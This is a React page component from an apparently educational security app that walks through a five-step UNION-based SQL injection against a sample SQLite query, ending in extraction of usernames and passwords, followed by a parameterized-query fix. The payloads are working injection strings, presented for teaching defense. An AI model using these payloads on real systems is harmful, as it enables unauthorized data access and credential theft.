'use client';

import { FlaskConical, AlertTriangle } from 'lucide-react';
import CodeBlock from '../../../components/CodeBlock';

const steps = [
  {
    title: 'Step 1: Determine Number of Columns',
    input: '1 ORDER BY 3 --',
    sql: 'SELECT id, name, price FROM products WHERE id = 1 ORDER BY 3 --',
    explanation: 'The attacker uses ORDER BY to find how many columns the original query returns. If ORDER BY 3 works but ORDER BY 4 throws an error, there are 3 columns.',
  },
  {
    title: 'Step 2: Find Displayable Columns',
    input: "0 UNION SELECT 'a', 'b', 'c' --",
    sql: "SELECT id, name, price FROM products WHERE id = 0 UNION SELECT 'a', 'b', 'c' --",
    explanation: "Using id=0 (no results), the attacker sees which of 'a', 'b', 'c' appear on the page. This reveals which column positions are displayed.",
  },
  {
    title: 'Step 3: Extract Database Version',
    input: '0 UNION SELECT 1, sqlite_version(), 3 --',
    sql: 'SELECT id, name, price FROM products WHERE id = 0 UNION SELECT 1, sqlite_version(), 3 --',
    explanation: 'The database version is injected into a displayable column. This helps the attacker tailor further attacks to the specific database.',
  },
  {
    title: 'Step 4: Extract Table Names',
    input: "0 UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --",
    sql: "SELECT id, name, price FROM products WHERE id = 0 UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --",
    explanation: 'The attacker queries the database schema to discover all table names. In SQLite, sqlite_master contains this metadata.',
  },
  {
    title: 'Step 5: Extract User Data',
    input: "0 UNION SELECT 1, username || ':' || password, 3 FROM users --",
    sql: "SELECT id, name, price FROM products WHERE id = 0 UNION SELECT 1, username || ':' || password, 3 FROM users --",
    explanation: 'The attacker extracts usernames and passwords from the users table by concatenating them into a displayable column.',
  },
];

export default function UnionDemoPage() {
  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold flex items-center gap-2">
          <FlaskConical className="h-6 w-6 text-zinc-400" />
          UNION-based Injection Demo
        </h1>
        <p className="mt-1 text-sm text-zinc-400">
          Step-by-step walkthrough of a UNION SELECT attack to extract data from a database.
        </p>
      </div>

      {/* Vulnerable form mockup */}
      <div className="rounded-lg border border-zinc-800 bg-zinc-900 p-5 space-y-3">
        <div className="flex items-center gap-2 text-sm text-red-400">
          <AlertTriangle className="h-4 w-4" />
          <span className="font-medium">Vulnerable Product Lookup (Demo Only)</span>
        </div>
        <div className="flex gap-2">
          <input
            type="text"
            disabled
            placeholder="Enter product ID..."
            className="w-48 rounded border border-zinc-700 bg-zinc-800 px-3 py-2 text-sm text-zinc-500 cursor-not-allowed"
          />
          <button disabled className="rounded bg-zinc-700 px-4 py-2 text-sm text-zinc-500 cursor-not-allowed">
            Lookup (Disabled)
          </button>
        </div>
        <p className="text-xs text-zinc-600">↑ This form is for display only.</p>
      </div>

      {/* Vulnerable query template */}
      <div>
        <h3 className="text-sm font-medium text-zinc-300 mb-2">Vulnerable Query Template</h3>
        <CodeBlock
          code={`SELECT id, name, price FROM products WHERE id = {user_input}`}
          highlight={true}
        />
        <p className="mt-2 text-xs text-zinc-500">
          Notice: the input is not quoted — it is expected to be a number but is not validated.
        </p>
      </div>

      {/* Step by step */}
      <div className="space-y-4">
        <h2 className="text-lg font-semibold">Attack Walkthrough</h2>
        {steps.map((s, i) => (
          <div key={i} className="rounded-lg border border-zinc-800 bg-zinc-900 p-4 space-y-3">
            <h3 className="font-medium text-zinc-100">{s.title}</h3>
            <div>
              <span className="text-xs text-zinc-500">Injected Input</span>
              <p className="code-font text-amber-400 text-sm">{s.input}</p>
            </div>
            <div>
              <span className="text-xs text-zinc-500 block mb-1">Resulting SQL</span>
              <CodeBlock code={s.sql} highlight={true} />
            </div>
            <p className="text-sm text-zinc-400">{s.explanation}</p>
          </div>
        ))}

        {/* Final result */}
        <div className="rounded border border-red-500/20 bg-red-500/5 p-4 space-y-2">
          <h3 className="font-medium text-red-400">⛔ Attack Result</h3>
          <p className="text-sm text-zinc-400">
            Through 5 systematic steps, the attacker has extracted the entire users table
            including usernames and passwords — all through a single numeric input field.
          </p>
        </div>
      </div>

      {/* Secure version */}
      <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-4 space-y-2">
        <h3 className="font-medium text-emerald-400">✓ Secure Version — Parameterized Query</h3>
        <CodeBlock code={`SELECT id, name, price FROM products WHERE id = ?\n-- Parameters: [user_input]\n-- Input is validated as integer before query execution`} />
        <p className="text-sm text-zinc-400">
          With parameterized queries, the input is bound as a value.
          Combined with type validation (ensuring the ID is an integer), UNION injection becomes impossible.
        </p>
      </div>
    </div>
  );
}
